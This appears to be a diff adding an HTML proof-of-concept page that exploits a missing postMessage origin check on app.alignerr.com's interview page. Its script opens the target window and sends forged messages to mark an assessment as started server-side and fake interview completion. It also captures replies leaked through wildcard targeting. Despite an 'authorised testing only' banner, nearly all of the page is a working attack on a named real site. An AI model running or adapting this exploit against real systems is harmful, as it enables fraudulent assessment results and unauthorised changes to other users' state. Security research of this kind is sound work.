@@ -1,0 +1,180 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PoC — postMessage Origin Validation Missing</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: monospace; background: #0f0f0f; color: #e0e0e0; padding: 24px; }
+    h1 { color: #ff4c4c; font-size: 1.1rem; margin-bottom: 4px; }
+    .subtitle { color: #888; font-size: 0.8rem; margin-bottom: 24px; }
+    .section { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 6px; padding: 16px; margin-bottom: 16px; }
+    .section h2 { font-size: 0.85rem; color: #aaa; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.05em; }
+    label { display: block; font-size: 0.8rem; color: #888; margin-bottom: 4px; }
+    input { width: 100%; padding: 8px 10px; background: #111; border: 1px solid #333; border-radius: 4px; color: #e0e0e0; font-family: monospace; font-size: 0.85rem; margin-bottom: 10px; }
+    .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 4px; }
+    button { padding: 8px 14px; border: none; border-radius: 4px; cursor: pointer; font-family: monospace; font-size: 0.82rem; font-weight: bold; }
+    .btn-open   { background: #2563eb; color: #fff; }
+    .btn-start  { background: #16a34a; color: #fff; }
+    .btn-started{ background: #7c3aed; color: #fff; }
+    .btn-finish { background: #dc2626; color: #fff; }
+    .btn-all    { background: #b45309; color: #fff; }
+    .btn-listen { background: #0891b2; color: #fff; }
+    button:disabled { opacity: 0.4; cursor: not-allowed; }
+    #log { background: #0a0a0a; border: 1px solid #222; border-radius: 4px; padding: 12px; height: 240px; overflow-y: auto; font-size: 0.78rem; line-height: 1.6; }
+    .log-info  { color: #60a5fa; }
+    .log-warn  { color: #fbbf24; }
+    .log-success { color: #34d399; }
+    .log-error { color: #f87171; }
+    .log-recv  { color: #c084fc; }
+    .badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 0.7rem; margin-right: 4px; }
+    .badge-high { background: #7f1d1d; color: #fca5a5; }
+    .warn-box { background: #1c1400; border: 1px solid #713f12; border-radius: 4px; padding: 10px 14px; font-size: 0.78rem; color: #fde68a; margin-bottom: 14px; }
+    .step { display: flex; gap: 6px; align-items: flex-start; font-size: 0.8rem; color: #aaa; margin-bottom: 6px; }
+    .step-num { background: #333; color: #fff; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 0.7rem; }
+  </style>
+</head>
+<body>
+
+<h1>⚠ PoC: postMessage Handler — Missing Origin Validation</h1>
+<p class="subtitle">
+  File: <code>src/pages/interview-page/use-interview-state.ts:80</code> &nbsp;|&nbsp;
+  <span class="badge badge-high">HIGH</span>
+  No <code>event.origin</code> check on <code>window.addEventListener('message', …)</code>
+</p>
+
+<div class="warn-box">
+  <strong>For authorised security testing only.</strong>
+  This page must be served from a <em>different origin</em> than <code>app.alignerr.com</code>
+  (e.g. open directly as a <code>file://</code> page, or from <code>localhost</code>) to prove the cross-origin bypass.
+</div>
+
+<!-- STEP-BY-STEP GUIDE -->
+<div class="section">
+  <h2>How to run this test</h2>
+  <div class="step"><span class="step-num">1</span>Enter the full interview URL below (copy it from the browser address bar while on the interview page).</div>
+  <div class="step"><span class="step-num">2</span>Click <strong>Open Target Window</strong> — the interview page opens in a new window.</div>
+  <div class="step"><span class="step-num">3</span>Wait ~3–5 s for the page to finish loading, then fire one or more attack messages.</div>
+  <div class="step"><span class="step-num">4</span>Watch the log here <em>and</em> observe state changes in the target window.</div>
+</div>
+
+<!-- CONFIG -->
+<div class="section">
+  <h2>Target</h2>
+  <label>Interview page URL</label>
+  <input id="targetUrl" type="url" placeholder="https://app.alignerr.com/interview/..." />
+
+  <div class="btn-row">
+    <button class="btn-open" onclick="openTarget()">Open Target Window</button>
+    <button class="btn-listen" onclick="startListening()">Start Listening for Responses</button>
+  </div>
+</div>
+
+<!-- ATTACK VECTORS -->
+<div class="section">
+  <h2>Attack vectors</h2>
+  <p style="font-size:0.78rem;color:#888;margin-bottom:12px;">Each button sends a single message to the target window using <code>'*'</code> as the target origin.</p>
+
+  <div class="btn-row">
+    <button class="btn-start" onclick="sendMsg('INTERVIEW_CAN_START')" title="Triggers updateAssessmentMetadata mutation (marks assessment as started server-side) then expects INTERVIEW_CAN_START_TRUE back.">
+      1 · INTERVIEW_CAN_START
+    </button>
+    <button class="btn-started" onclick="sendMsg('INTERVIEW_STARTED')" title="Calls onInterviewStarted() — updates in-app interview started state.">
+      2 · INTERVIEW_STARTED
+    </button>
+    <button class="btn-finish" onclick="sendMsg('INTERVIEW_FEEDBACK_SUBMITTED')" title="Calls onInterviewComplete() — navigates to /home and refetches assessment queries.">
+      3 · INTERVIEW_FEEDBACK_SUBMITTED
+    </button>
+    <button class="btn-all" onclick="runFullSequence()" title="Fires all three messages in sequence with a short delay between each, simulating a full fake interview run.">
+      ▶ Full Sequence (all 3)
+    </button>
+  </div>
+</div>
+
+<!-- LOG -->
+<div class="section">
+  <h2>Log <span style="float:right;font-size:0.75rem;color:#555;cursor:pointer" onclick="clearLog()">clear</span></h2>
+  <div id="log"><span class="log-info">[ready] Enter a target URL and open the window to begin.</span></div>
+</div>
+
+<script>
+  let targetWindow = null;
+  let listening = false;
+
+  function log(msg, cls = 'log-info') {
+    const el = document.getElementById('log');
+    const ts = new Date().toISOString().substring(11, 23);
+    el.innerHTML += `\n<span class="${cls}">[${ts}] ${msg}</span>`;
+    el.scrollTop = el.scrollHeight;
+  }
+
+  function clearLog() {
+    document.getElementById('log').innerHTML = '';
+  }
+
+  function openTarget() {
+    const url = document.getElementById('targetUrl').value.trim();
+    if (!url) { log('⚠ Please enter a target URL first.', 'log-warn'); return; }
+    if (!url.startsWith('https://app.alignerr.com/interview')) {
+      log('⚠ URL does not look like an interview page — proceeding anyway.', 'log-warn');
+    }
+    targetWindow = window.open(url, 'alignerr_target', 'width=1280,height=900');
+    log(`✓ Opened target window → ${url}`, 'log-success');
+    log('Wait for the interview page to fully load before sending messages.', 'log-info');
+  }
+
+  function startListening() {
+    if (listening) { log('Already listening.', 'log-warn'); return; }
+    listening = true;
+    window.addEventListener('message', (evt) => {
+      // This also proves the outgoing '*' wildcard leak:
+      // app.alignerr.com sends INTERVIEW_CAN_START_TRUE/FALSE back with target='*',
+      // meaning ANY origin (including this page) receives it.
+      log(
+        `← RECEIVED from <strong>${evt.origin}</strong>: <code>${JSON.stringify(evt.data)}</code>`,
+        'log-recv'
+      );
+    });
+    log('✓ Listening for incoming postMessages (proves wildcard leak on outgoing messages).', 'log-success');
+  }
+
+  function sendMsg(msg) {
+    if (!targetWindow || targetWindow.closed) {
+      log('⚠ No target window open. Click "Open Target Window" first.', 'log-warn');
+      return;
+    }
+    targetWindow.postMessage(msg, '*');
+    log(`→ SENT <code>${msg}</code> to target window`, 'log-warn');
+    describeExpectedEffect(msg);
+  }
+
+  function describeExpectedEffect(msg) {
+    const effects = {
+      'INTERVIEW_CAN_START':
+        'Expected: <code>updateAssessmentMetadata</code> GraphQL mutation fires (marks assessment started server-side). ' +
+        'If listening, you should receive <code>INTERVIEW_CAN_START_TRUE</code> back from the target window (wildcard leak).',
+      'INTERVIEW_STARTED':
+        'Expected: <code>onInterviewStarted()</code> runs — in-app state updated to "interview started".',
+      'INTERVIEW_FEEDBACK_SUBMITTED':
+        'Expected: <code>onInterviewComplete()</code> runs — page navigates to <code>/home</code> and assessment queries are refetched, as if the interview was legitimately completed.',
+    };
+    if (effects[msg]) log(`ℹ ${effects[msg]}`, 'log-info');
+  }
+
+  async function runFullSequence() {
+    if (!targetWindow || targetWindow.closed) {
+      log('⚠ No target window open. Click "Open Target Window" first.', 'log-warn');
+      return;
+    }
+    log('▶ Starting full attack sequence…', 'log-warn');
+    sendMsg('INTERVIEW_CAN_START');
+    await new Promise(r => setTimeout(r, 1500));
+    sendMsg('INTERVIEW_STARTED');
+    await new Promise(r => setTimeout(r, 1000));
+    sendMsg('INTERVIEW_FEEDBACK_SUBMITTED');
+    log('✓ Full sequence complete. Check the target window for navigation to /home.', 'log-success');
+  }
+</script>
+</body>
+</html>
